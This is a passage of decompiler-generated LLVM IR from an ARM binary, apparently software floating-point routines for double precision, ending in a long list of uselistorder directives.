  %v4_1cca0 = icmp eq i32 %v2_1cca0, 0
  br i1 %v4_1cca0, label %dec_label_pc_1cce0, label %dec_label_pc_1cca8

dec_label_pc_1cca8:                               ; preds = %.thread10
  %v3_1cca8 = mul i32 %v0_1cca8, 16
  %v4_1ccac = udiv i32 %v1_1ccac, 268435456
  %v5_1ccac = or i32 %v3_1cca8, %v4_1ccac
  store i32 %v5_1ccac, i32* %r5.global-to-local, align 4
  %v3_1ccb0 = mul i32 %v1_1ccac, 16
  store i32 %v3_1ccb0, i32* %r6.global-to-local, align 4
  %v3_1ccb4 = mul nuw i32 %v3_1cc84, 8
  %v4_1ccb8 = udiv i32 %v15_1cc88, 536870912
  %v5_1ccb8 = or i32 %v4_1ccb8, %v3_1ccb4
  %v3_1ccbc = mul i32 %v15_1cc88, 8
  %v3_1ccc0 = udiv i32 %v0_1ccc0, 16
  store i32 %v3_1ccc0, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1ccc0, 16
  br i1 %tmp, label %dec_label_pc_1ccc8, label %dec_label_pc_1cc38

dec_label_pc_1ccc8:                               ; preds = %dec_label_pc_1cca8
  %v1_1ccc8 = and i32 %v1_1cce4.ph, 1048576
  %v2_1ccc8 = icmp eq i32 %v1_1ccc8, 0
  br i1 %v2_1ccc8, label %dec_label_pc_1ccd0, label %.thread11.loopexit

dec_label_pc_1ccd0:                               ; preds = %dec_label_pc_1ccc8
  %v2_1ccd0 = or i32 %v2_1cce4, %v1_1cce4.ph
  store i32 %v2_1ccd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1cc38.outer

dec_label_pc_1cce0:                               ; preds = %.thread10
  store i32 %v15_1cc88, i32* %r3.global-to-local, align 4
  store i32 %v3_1cc84, i32* %r2.global-to-local, align 4
  %v1_1cce0 = and i32 %v1_1cce4.ph, 1048576
  %v2_1cce0 = icmp eq i32 %v1_1cce0, 0
  br i1 %v2_1cce0, label %bb103, label %.thread11

bb103:                                            ; preds = %dec_label_pc_1cce0
  %v3_1cce4 = or i32 %v2_1cce4, %v1_1cce4.ph
  store i32 %v3_1cce4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_1ccc8
  store i32 %v3_1ccbc, i32* %r3.global-to-local, align 4
  store i32 %v5_1ccb8, i32* %r2.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_1cce0, %bb103
  %v1_1ccec = add nsw i32 %v4_1cc0c, 515
  store i32 %v1_1ccec, i32* %ip.global-to-local, align 4
  %v2_1ccec = icmp ugt i32 %v1_1cc10, 252
  %v7_1ccec = icmp eq i32 %v1_1cc10, 253
  %v2_1ccf0 = xor i1 %v7_1ccec, true
  %v3_1ccf0 = and i1 %v2_1ccec, %v2_1ccf0
  br i1 %v3_1ccf0, label %bb104, label %bb105

bb104:                                            ; preds = %.thread11
  %v6_1ccf0 = icmp ugt i32 %v1_1ccec, 1791
  %v11_1ccf0 = icmp eq i32 %v1_1ccec, 1792
  br label %bb105

bb105:                                            ; preds = %.thread11, %bb104
  %v1_1ccf4 = phi i1 [ %v7_1ccec, %.thread11 ], [ %v11_1ccf0, %bb104 ]
  %v0_1ccf4 = phi i1 [ %v2_1ccec, %.thread11 ], [ %v6_1ccf0, %bb104 ]
  %v2_1ccf4 = xor i1 %v1_1ccf4, true
  %v3_1ccf4 = and i1 %v0_1ccf4, %v2_1ccf4
  call void @__pseudo_cond_branch(i1 %v3_1ccf4, i32 ptrtoint (i32* @global_var_1ca24.1099 to i32))
  %v0_1ccf8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1ccf8 = load i32, i32* %r2.global-to-local, align 4
  %v2_1ccf8 = sub i32 %v0_1ccf8, %v1_1ccf8
  store i32 %v2_1ccf8, i32* %ip.global-to-local, align 4
  %v3_1ccf8 = icmp uge i32 %v0_1ccf8, %v1_1ccf8
  %v9_1ccf8 = icmp eq i32 %v0_1ccf8, %v1_1ccf8
  br i1 %v9_1ccf8, label %bb106, label %.thread12

bb106:                                            ; preds = %bb105
  %v1_1ccfc = load i32, i32* %r6.global-to-local, align 4
  %v2_1ccfc = load i32, i32* %r3.global-to-local, align 4
  %v3_1ccfc = sub i32 %v1_1ccfc, %v2_1ccfc
  store i32 %v3_1ccfc, i32* %ip.global-to-local, align 4
  %v4_1ccfc = icmp uge i32 %v1_1ccfc, %v2_1ccfc
  %v10_1ccfc = icmp eq i32 %v1_1ccfc, %v2_1ccfc
  br i1 %v10_1ccfc, label %bb107, label %.thread12

bb107:                                            ; preds = %bb106
  %v1_1cd00 = load i32, i32* %r1.global-to-local, align 4
  %v2_1cd00 = urem i32 %v1_1cd00, 2
  %v3_1cd00 = icmp ne i32 %v2_1cd00, 0
  %v4_1cd00 = udiv i32 %v1_1cd00, 2
  store i32 %v4_1cd00, i32* %ip.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb105, %bb106, %bb107
  %v1_1cd04 = phi i1 [ %v3_1ccf8, %bb105 ], [ %v4_1ccfc, %bb106 ], [ %v3_1cd00, %bb107 ]
  %v0_1cd04 = load i32, i32* %r1.global-to-local, align 4
  %v2_1cd04 = zext i1 %v1_1cd04 to i32
  %v3_1cd04 = add i32 %v2_1cd04, %v0_1cd04
  store i32 %v3_1cd04, i32* %r1.global-to-local, align 4
  %v0_1cd08 = load i32, i32* %r0.global-to-local, align 4
  %v1_1cd08 = load i32, i32* %r4.global-to-local, align 4
  %v2_1cd08 = and i32 %v1_1cd08, 4096
  %v3_1cd08 = icmp ne i32 %v2_1cd08, 0
  %v4_1cd08 = mul i32 %v1_1cd08, 1048576
  %v6_1cd08 = add i32 %v4_1cd08, %v0_1cd08
  %v7_1cd08 = zext i1 %v3_1cd08 to i32
  %v8_1cd08 = add i32 %v7_1cd08, %v6_1cd08
  store i32 %v8_1cd08, i32* %r0.global-to-local, align 4
  %v2_1cd0c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1cd0c, i32* %r4.global-to-local, align 4
  store i32 %v6_1cbac, i32* %r5.global-to-local, align 4
  store i32 %v9_1cbac, i32* %r6.global-to-local, align 4
  ret i32 %v8_1cd08

dec_label_pc_1cd10:                               ; preds = %dec_label_pc_1cbcc
  %v1_1cd10 = and i32 %v2_1cbd0, -2147483648
  %v4_1cd14 = urem i32 %v1_1cbb8, 1048576
  %v5_1cd14 = or i32 %v1_1cd10, %v4_1cd14
  store i32 %v5_1cd14, i32* %r0.global-to-local, align 4
  %v6_1cd18 = add nsw i32 %v2_1cbcc, 1023
  store i32 %v6_1cd18, i32* %r4.global-to-local, align 4
  %v8_1cd18 = sub nsw i32 0, %v2_1cbcc
  %v9_1cd18 = and i32 %v6_1cd18, %v8_1cd18
  %v11_1cd18 = icmp slt i32 %v2_1cbcc, -1023
  %v12_1cd18 = icmp eq i32 %v6_1cd18, 0
  %v7_1cd1c = icmp sgt i32 %v2_1cbcc, -1023
  br i1 %v7_1cd1c, label %bb108, label %bb109

bb108:                                            ; preds = %dec_label_pc_1cd10
  %v10_1cd1c = sub nsw i32 1024, %v2_1cbcc
  store i32 %v10_1cd1c, i32* %r5.global-to-local, align 4
  %v14_1cd1c = and i32 %v10_1cd1c, %v6_1cd18
  %v16_1cd1c = icmp slt i32 %v10_1cd1c, 0
  %v17_1cd1c = icmp eq i32 %v6_1cd18, 2047
  br label %bb109

bb109:                                            ; preds = %dec_label_pc_1cd10, %bb108
  %v2_1cd24.in = phi i32 [ %v9_1cd18, %dec_label_pc_1cd10 ], [ %v14_1cd1c, %bb108 ]
  %v1_1cd24 = phi i1 [ %v11_1cd18, %dec_label_pc_1cd10 ], [ %v16_1cd1c, %bb108 ]
  %v0_1cd24 = phi i1 [ %v12_1cd18, %dec_label_pc_1cd10 ], [ %v17_1cd1c, %bb108 ]
  %v2_1cd24 = icmp slt i32 %v2_1cd24.in, 0
  %v3_1cd20 = xor i1 %v2_1cd24, %v1_1cd24
  %v4_1cd20 = or i1 %v0_1cd24, %v3_1cd20
  br i1 %v4_1cd20, label %bb111, label %bb110

bb110:                                            ; preds = %bb109
  %v9_1cd2085 = mul i32 %v6_1cd18, 1048576
  %v10_1cd2086 = or i32 %v9_1cd2085, %v5_1cd14
  store i32 %v10_1cd2086, i32* %r0.global-to-local, align 4
  store i32 %v3_1cbac, i32* %r4.global-to-local, align 4
  store i32 %v6_1cbac, i32* %r5.global-to-local, align 4
  ret i32 %v10_1cd2086

bb111:                                            ; preds = %bb109
  %v1_1cd28 = or i32 %v5_1cd14, 1048576
  store i32 %v1_1cd28, i32* %r0.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v1_1cd30 = add nsw i32 %v2_1cbcc, 1022
  store i32 %v1_1cd30, i32* @r4, align 4
  %v3_1cd30 = sub nsw i32 -1023, %v2_1cbcc
  %v4_1cd30 = and i32 %v6_1cd18, %v3_1cd30
  %v5_1cd30 = icmp slt i32 %v4_1cd30, 0
  store i1 %v5_1cd30, i1* @cpsr_v, align 1
  %v6_1cd30 = icmp slt i32 %v2_1cbcc, -1022
  store i1 %v6_1cd30, i1* @cpsr_n, align 1
  %v7_1cd30 = icmp eq i32 %v6_1cd18, 1
  store i1 %v7_1cd30, i1* @cpsr_z, align 1
  %v1_1cd34 = call i32 @function_1ca24(i32 %v1_1cd28)
  store i32 %v1_1cd34, i32* %r0.global-to-local, align 4
  %v0_1cd38 = load i32, i32* @r5, align 4
  %v1_1cd38 = load i32, i32* @r6, align 4
  %v2_1cd38 = or i32 %v1_1cd38, %v0_1cd38
  store i32 %v2_1cd38, i32* @lr, align 4
  %v1_1cd3c = call i32 @function_1ca24(i32 %v1_1cd34)
  store i32 %v1_1cd3c, i32* %r0.global-to-local, align 4
  %v0_1cd40.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_1cd44.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1cd40

dec_label_pc_1cd40:                               ; preds = %.thread1, %.thread2, %bb93, %bb111
  %v4_1cd40.pre-phi = phi i32 [ %v5_1cbbc, %.thread1 ], [ %.pre148.pre-phi, %.thread2 ], [ %v5_1cbbc, %bb93 ], [ %v5_1cbbc, %bb111 ]
  %v0_1cd44 = phi i32 [ %v5_1cbb8, %.thread1 ], [ %v5_1cbb8, %.thread2 ], [ %v5_1cbb8, %bb93 ], [ %v0_1cd44.pre, %bb111 ]
  %v2_1cd48 = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb93 ], [ %v0_1cd40.pre, %bb111 ]
  %v5_1cd40 = and i32 %v2_1cd48, %v4_1cd40.pre-phi
  store i32 %v5_1cd40, i32* @r5, align 4
  %v4_1cd44 = icmp eq i32 %v2_1cd48, %v0_1cd44
  br i1 %v4_1cd44, label %bb112, label %bb113

bb112:                                            ; preds = %dec_label_pc_1cd40
  %v5_1cd48 = icmp eq i32 %v5_1cd40, %v2_1cd48
  br label %bb113

bb113:                                            ; preds = %dec_label_pc_1cd40, %bb112
  %v0_1cd4c = phi i1 [ false, %dec_label_pc_1cd40 ], [ %v5_1cd48, %bb112 ]
  call void @__pseudo_cond_branch(i1 %v0_1cd4c, i32 ptrtoint (i32* @global_var_1cba0.1100 to i32))
  %v0_1cd50 = load i32, i32* @r4, align 4
  %v1_1cd50 = load i32, i32* %ip.global-to-local, align 4
  %v4_1cd50 = icmp eq i32 %v1_1cd50, %v0_1cd50
  br i1 %v4_1cd50, label %dec_label_pc_1cd58, label %dec_label_pc_1cd74

dec_label_pc_1cd58:                               ; preds = %bb113
  %v0_1cd58 = load i32, i32* @r1, align 4
  %v1_1cd58 = load i32, i32* %r0.global-to-local, align 4
  %v4_1cd58 = mul i32 %v1_1cd58, 4096
  %v5_1cd58 = or i32 %v4_1cd58, %v0_1cd58
  store i32 %v5_1cd58, i32* %r4.global-to-local, align 4
  %v1_1cd5c = icmp ne i32 %v5_1cd58, 0
  call void @__pseudo_cond_branch(i1 %v1_1cd5c, i32 ptrtoint (i32* @global_var_1cba0.1100 to i32))
  %v0_1cd60 = load i32, i32* @r5, align 4
  %v1_1cd60 = load i32, i32* %ip.global-to-local, align 4
  %v1_1cd64 = icmp ne i32 %v1_1cd60, %v0_1cd60
  call void @__pseudo_cond_branch(i1 %v1_1cd64, i32 ptrtoint (i32* @global_var_1cb88.1101 to i32))
  store i32 %arg4, i32* @r1, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_1cd70 = call i32 @function_1cba0(i32 %arg3, i32 %arg4)
  store i32 %v2_1cd70, i32* %r0.global-to-local, align 4
  %v1_1cd74.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1cd74

dec_label_pc_1cd74:                               ; preds = %bb113, %dec_label_pc_1cd58
  %v1_1cd74 = phi i32 [ %v1_1cd50, %bb113 ], [ %v1_1cd74.pre, %dec_label_pc_1cd58 ]
  %v0_1cd74 = load i32, i32* @r5, align 4
  %v4_1cd74 = icmp eq i32 %v0_1cd74, %v1_1cd74
  br i1 %v4_1cd74, label %dec_label_pc_1cd7c, label %dec_label_pc_1cd74.dec_label_pc_1cd90_crit_edge

dec_label_pc_1cd74.dec_label_pc_1cd90_crit_edge:  ; preds = %dec_label_pc_1cd74
  %v1_1cd90.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1cd90

dec_label_pc_1cd7c:                               ; preds = %dec_label_pc_1cd74
  %v4_1cd7c = mul i32 %arg3, 4096
  %v5_1cd7c = or i32 %v4_1cd7c, %arg4
  store i32 %v5_1cd7c, i32* %r5.global-to-local, align 4
  %v7_1cd7c = icmp eq i32 %v5_1cd7c, 0
  call void @__pseudo_cond_branch(i1 %v7_1cd7c, i32 ptrtoint (i32* @global_var_1cb3c.1102 to i32))
  store i32 %arg4, i32* @r1, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_1cd8c = call i32 @function_1cba0(i32 %arg3, i32 %arg4)
  store i32 %v2_1cd8c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1cd90

dec_label_pc_1cd90:                               ; preds = %dec_label_pc_1cd74.dec_label_pc_1cd90_crit_edge, %dec_label_pc_1cd7c
  %v1_1cd90 = phi i32 [ %v1_1cd90.pre, %dec_label_pc_1cd74.dec_label_pc_1cd90_crit_edge ], [ %v2_1cd8c, %dec_label_pc_1cd7c ]
  %v0_1cd90 = load i32, i32* @r1, align 4
  %v3_1cd90 = mul i32 %v1_1cd90, 2
  %v4_1cd90 = or i32 %v3_1cd90, %v0_1cd90
  store i32 %v4_1cd90, i32* %r6.global-to-local, align 4
  %v6_1cd90 = icmp eq i32 %v4_1cd90, 0
  br i1 %v6_1cd90, label %dec_label_pc_1cd90._crit_edge, label %bb114

dec_label_pc_1cd90._crit_edge:                    ; preds = %dec_label_pc_1cd90
  %.pre = mul i32 %arg3, 2
  %.pre80 = or i32 %.pre, %arg4
  br label %bb115

bb114:                                            ; preds = %dec_label_pc_1cd90
  %v4_1cd94 = mul i32 %arg3, 2
  %v5_1cd94 = or i32 %v4_1cd94, %arg4
  store i32 %v5_1cd94, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_1cd94, 0
  br label %bb115

bb115:                                            ; preds = %dec_label_pc_1cd90._crit_edge, %bb114
  %v4_1cda4.pre-phi = phi i32 [ %.pre80, %dec_label_pc_1cd90._crit_edge ], [ %v5_1cd94, %bb114 ]
  %v0_1cd98 = phi i1 [ false, %dec_label_pc_1cd90._crit_edge ], [ %phitmp, %bb114 ]
  call void @__pseudo_cond_branch(i1 %v0_1cd98, i32 ptrtoint (i32* @global_var_1cad4.1103 to i32))
  %v0_1cd9c = load i32, i32* @r1, align 4
  %v1_1cd9c = load i32, i32* %r0.global-to-local, align 4
  %v3_1cd9c = mul i32 %v1_1cd9c, 2
  %v4_1cd9c = or i32 %v3_1cd9c, %v0_1cd9c
  store i32 %v4_1cd9c, i32* %r4.global-to-local, align 4
  %v1_1cda0 = icmp ne i32 %v4_1cd9c, 0
  call void @__pseudo_cond_branch(i1 %v1_1cda0, i32 ptrtoint (i32* @global_var_1cb88.1101 to i32))
  store i32 %v4_1cda4.pre-phi, i32* %r5.global-to-local, align 4
  %v1_1cda8 = icmp ne i32 %v4_1cda4.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_1cda8, i32 ptrtoint (i32* @global_var_1cb3c.1102 to i32))
  %v0_1cdac = load i32, i32* %r0.global-to-local, align 4
  %v1_1cdac = load i32, i32* @r1, align 4
  %v2_1cdac = call i32 @function_1cba0(i32 %v0_1cdac, i32 %v1_1cdac)
  store i32 %v2_1cdac, i32* %r0.global-to-local, align 4
  ret i32 %v2_1cdac

; uselistorder directives
  uselistorder i32 %v5_1cd94, { 1, 0, 2 }
  uselistorder i32 %v1_1cd50, { 1, 0 }
  uselistorder i32 %v10_1cd1c, { 2, 0, 1 }
  uselistorder i32 %v6_1cd18, { 3, 4, 0, 1, 2, 6, 5, 7 }
  uselistorder i32 %v5_1cd14, { 1, 0, 2 }
  uselistorder i32 %v2_1ccfc, { 1, 0, 2 }
  uselistorder i32 %v1_1ccfc, { 1, 0, 2 }
  uselistorder i32 %v1_1ccf8, { 1, 0, 2 }
  uselistorder i32 %v0_1ccf8, { 1, 0, 2 }
  uselistorder i1 %v7_1ccec, { 1, 0 }
  uselistorder i32 %v2_1ccd0, { 1, 0 }
  uselistorder i32 %v3_1ccbc, { 2, 1, 0 }
  uselistorder i32 %v3_1ccb0, { 0, 2, 1 }
  uselistorder i32 %v5_1ccac, { 2, 0, 1 }
  uselistorder i32 %v6_1cc9c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1cc88, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_1cc84, { 3, 0, 2, 1 }
  uselistorder i32 %v0_1cc90, { 0, 2, 1 }
  uselistorder i32 %v1_1cc9c, { 1, 0 }
  uselistorder i32 %v6_1cc80, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1cc6c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_1cc68, { 0, 2, 1 }
  uselistorder i32 %v0_1cc74, { 0, 2, 1 }
  uselistorder i32 %v1_1cc80, { 1, 0 }
  uselistorder i32 %v6_1cc64, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1cc50, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1cc58, { 0, 2, 1 }
  uselistorder i32 %v1_1cc64, { 1, 0 }
  uselistorder i32 %v3_1cc48, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_1cc3c, { 1, 2, 0 }
  uselistorder i32 %v3_1ccbc13, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_1ccb817, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_1cc3c, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1cc48, { 1, 0 }
  uselistorder i32 %storemerge136, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_1cce4.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1cc28, { 1, 0 }
  uselistorder i32 %v0_1cc2c, { 1, 0 }
  uselistorder i32 %v3_1cc18, { 1, 0 }
  uselistorder i1 %v1_1cc0c, { 1, 0 }
  uselistorder i32 %v3_1cbfc, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1cbf8, { 3, 2, 1, 0 }
  uselistorder i32 %v3_1cbf0, { 2, 1, 0 }
  uselistorder i32 %v5_1cbec, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_1cbcc, { 1, 5, 6, 4, 2, 3, 0, 7, 10, 9, 8, 11 }
  uselistorder i32 %v6_1cbbc, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1cbbc, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_1cbb8, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_1cbb8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_1cbac, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 1, 4, 5, 6, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 1, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 6, 7, 1, 2, 3, 4, 5, 8 }
  uselistorder i32* %r0.global-to-local, { 6, 18, 19, 2, 7, 17, 4, 8, 20, 21, 5, 9, 3, 10, 11, 14, 12, 13, 15, 16, 0, 1 }
  uselistorder i32* %ip.global-to-local, { 7, 8, 9, 6, 1, 2, 3, 4, 5, 0, 10 }
  uselistorder i32 (i32, i32)* @function_1cba0, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_1ca24, { 1, 0 }
  uselistorder i1* @cpsr_n, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i1* @cpsr_v, { 2, 3, 4, 5, 6, 7, 1, 0, 8, 9, 10 }
  uselistorder i32 1024, { 10, 17, 22, 12, 25, 18, 13, 14, 11, 26, 0, 35, 33, 15, 34, 9, 30, 31, 32, 16, 1, 2, 3, 4, 5, 6, 23, 24, 7, 8, 19, 27, 28, 21, 29, 20 }
  uselistorder i32 -1023, { 2, 0, 1, 3 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 7, 6, 37, 38, 39, 40, 20, 24, 25, 26, 2, 43, 23, 51, 47, 50, 45, 46, 22, 41, 42, 3, 44, 8, 21, 9, 10, 48, 11, 49, 4, 5, 15, 14, 12, 13, 0, 1, 18, 19, 16, 17 }
  uselistorder i32 536870912, { 2, 3, 0, 1, 4 }
  uselistorder i32 16, { 4, 9, 7, 8, 10, 11, 12, 13, 36, 14, 15, 5, 16, 17, 18, 37, 19, 20, 6, 21, 22, 65, 172, 173, 139, 140, 141, 0, 142, 143, 23, 24, 144, 145, 25, 146, 147, 105, 174, 193, 194, 175, 44, 103, 176, 40, 26, 27, 148, 149, 177, 178, 102, 28, 29, 30, 179, 156, 157, 97, 55, 180, 104, 1, 56, 45, 106, 181, 107, 108, 58, 59, 57, 182, 60, 98, 99, 100, 101, 183, 61, 62, 109, 110, 111, 112, 113, 114, 115, 195, 46, 47, 48, 196, 49, 197, 198, 50, 199, 200, 51, 201, 202, 203, 204, 205, 206, 150, 151, 152, 161, 162, 163, 164, 184, 185, 186, 190, 191, 192, 187, 52, 165, 42, 135, 53, 116, 131, 117, 158, 159, 209, 41, 153, 154, 166, 167, 168, 169, 170, 171, 75, 188, 189, 118, 155, 39, 31, 128, 76, 77, 78, 43, 79, 80, 81, 82, 83, 84, 85, 86, 32, 87, 88, 89, 90, 91, 2, 92, 93, 119, 3, 120, 66, 121, 67, 38, 122, 68, 123, 124, 125, 126, 69, 127, 70, 207, 210, 208, 71, 63, 129, 94, 95, 33, 54, 96, 73, 72, 74, 130, 34, 35, 132, 133, 134, 136, 137, 138, 64, 160 }
  uselistorder i32 8, { 4, 5, 6, 7, 8, 9, 80, 10, 81, 38, 11, 12, 27, 13, 82, 39, 14, 15, 28, 16, 0, 63, 62, 116, 112, 64, 189, 190, 191, 192, 1, 2, 193, 194, 195, 196, 197, 17, 198, 113, 55, 56, 83, 18, 264, 265, 266, 114, 245, 34, 199, 200, 201, 202, 33, 203, 246, 211, 129, 242, 243, 57, 115, 65, 66, 19, 20, 67, 21, 68, 117, 268, 118, 119, 120, 121, 267, 122, 123, 124, 125, 126, 127, 128, 244, 58, 130, 131, 247, 248, 132, 133, 36, 134, 135, 249, 102, 104, 103, 105, 106, 250, 251, 252, 253, 254, 107, 108, 109, 136, 137, 272, 46, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 47, 204, 214, 215, 216, 217, 218, 219, 220, 221, 222, 22, 48, 223, 44, 224, 225, 84, 255, 256, 257, 258, 259, 260, 297, 167, 40, 138, 23, 180, 187, 139, 140, 45, 291, 290, 288, 289, 181, 182, 183, 269, 270, 271, 292, 293, 294, 24, 212, 213, 3, 295, 51, 52, 49, 50, 29, 30, 42, 43, 53, 298, 263, 205, 206, 226, 227, 85, 228, 229, 230, 231, 35, 232, 69, 70, 233, 234, 235, 54, 236, 237, 238, 239, 41, 31, 32, 240, 241, 71, 261, 262, 141, 207, 208, 37, 209, 210, 172, 72, 73, 74, 75, 76, 77, 78, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 142, 143, 144, 110, 145, 146, 147, 148, 149, 152, 153, 154, 111, 155, 156, 157, 188, 150, 151, 158, 159, 160, 161, 162, 163, 59, 296, 164, 165, 166, 168, 169, 170, 171, 175, 176, 177, 178, 173, 174, 179, 98, 99, 60, 100, 101, 61, 25, 79, 26, 184, 185, 186 }
  uselistorder i32 4, { 13, 14, 188, 15, 16, 86, 395, 396, 189, 17, 18, 397, 398, 190, 19, 20, 79, 112, 264, 225, 80, 354, 21, 431, 432, 433, 115, 116, 117, 355, 356, 357, 358, 359, 360, 361, 0, 22, 76, 362, 363, 364, 365, 366, 367, 368, 74, 369, 118, 119, 120, 370, 371, 102, 372, 90, 373, 265, 266, 434, 435, 470, 471, 472, 103, 256, 442, 206, 23, 24, 269, 25, 26, 1, 332, 443, 444, 445, 446, 447, 374, 375, 376, 226, 227, 448, 449, 121, 104, 122, 123, 124, 125, 126, 127, 379, 128, 129, 386, 387, 105, 130, 207, 2, 208, 3, 209, 4, 210, 5, 450, 228, 273, 436, 437, 438, 439, 440, 27, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 454, 455, 456, 253, 254, 255, 451, 452, 453, 131, 132, 257, 258, 259, 260, 261, 262, 133, 263, 134, 135, 28, 136, 137, 29, 267, 268, 474, 138, 270, 271, 272, 139, 473, 441, 274, 275, 457, 276, 277, 278, 279, 280, 281, 113, 282, 458, 459, 460, 461, 106, 107, 211, 213, 212, 214, 215, 216, 217, 218, 219, 81, 220, 462, 88, 463, 464, 465, 140, 221, 283, 284, 285, 286, 287, 288, 475, 30, 466, 31, 100, 91, 92, 32, 482, 93, 78, 33, 34, 94, 95, 483, 484, 485, 486, 96, 487, 488, 489, 490, 97, 491, 492, 493, 494, 495, 35, 496, 497, 498, 499, 500, 98, 77, 501, 502, 503, 504, 505, 506, 36, 37, 99, 380, 381, 108, 399, 400, 401, 402, 109, 403, 404, 405, 406, 407, 75, 408, 409, 410, 467, 469, 468, 411, 524, 525, 141, 142, 143, 289, 290, 291, 292, 320, 38, 293, 144, 294, 145, 82, 295, 333, 146, 334, 335, 6, 344, 345, 346, 347, 147, 148, 296, 149, 7, 150, 297, 39, 298, 83, 151, 152, 513, 515, 514, 511, 512, 336, 337, 338, 339, 476, 477, 478, 479, 516, 517, 518, 480, 481, 153, 154, 155, 388, 389, 390, 391, 392, 393, 8, 40, 394, 523, 412, 41, 42, 43, 44, 9, 156, 68, 45, 46, 340, 157, 47, 158, 159, 160, 161, 162, 413, 48, 414, 163, 415, 416, 417, 418, 419, 420, 421, 164, 422, 423, 424, 425, 426, 427, 69, 430, 165, 166, 429, 191, 428, 382, 383, 110, 384, 385, 377, 378, 323, 507, 508, 509, 167, 168, 169, 170, 101, 111, 299, 171, 173, 84, 172, 174, 175, 176, 177, 178, 179, 300, 192, 49, 50, 51, 193, 194, 195, 196, 301, 197, 349, 10, 302, 303, 304, 519, 350, 305, 306, 222, 307, 520, 308, 309, 310, 311, 312, 313, 321, 351, 314, 324, 315, 316, 521, 317, 318, 319, 522, 180, 181, 182, 510, 183, 184, 322, 325, 326, 352, 52, 198, 199, 200, 201, 202, 203, 204, 53, 205, 114, 330, 327, 328, 329, 223, 331, 54, 55, 87, 85, 56, 57, 341, 58, 59, 60, 61, 62, 185, 63, 186, 70, 89, 71, 72, 11, 12, 342, 64, 343, 187, 65, 348, 73, 66, 353, 67, 224 }
  uselistorder i32 32, { 102, 103, 104, 105, 32, 33, 40, 62, 63, 35, 106, 34, 41, 107, 108, 109, 110, 39, 111, 88, 89, 90, 0, 91, 92, 64, 125, 122, 100, 101, 38, 65, 66, 69, 45, 5, 4, 67, 7, 6, 68, 70, 71, 53, 54, 55, 56, 3, 8, 57, 58, 123, 42, 43, 36, 112, 46, 28, 113, 124, 85, 86, 10, 9, 12, 11, 14, 13, 1, 37, 95, 93, 94, 114, 27, 115, 2, 47, 116, 117, 118, 119, 120, 29, 121, 72, 73, 96, 97, 98, 99, 83, 15, 16, 17, 44, 18, 48, 50, 19, 20, 74, 75, 87, 76, 77, 78, 79, 59, 82, 126, 127, 84, 80, 81, 60, 61, 51, 52, 22, 21, 24, 23, 30, 31, 26, 25, 49 }
  uselistorder i32 33, { 3, 4, 5, 1, 6, 7, 2, 0 }
  uselistorder i32 768, { 2, 0, 1 }
  uselistorder i32 268435456, { 1, 3, 4, 0, 6, 7, 8, 9, 10, 5, 2, 11 }
  uselistorder i32 16777216, { 1, 2, 0, 4, 3, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13, 15, 17, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 45, 44 }
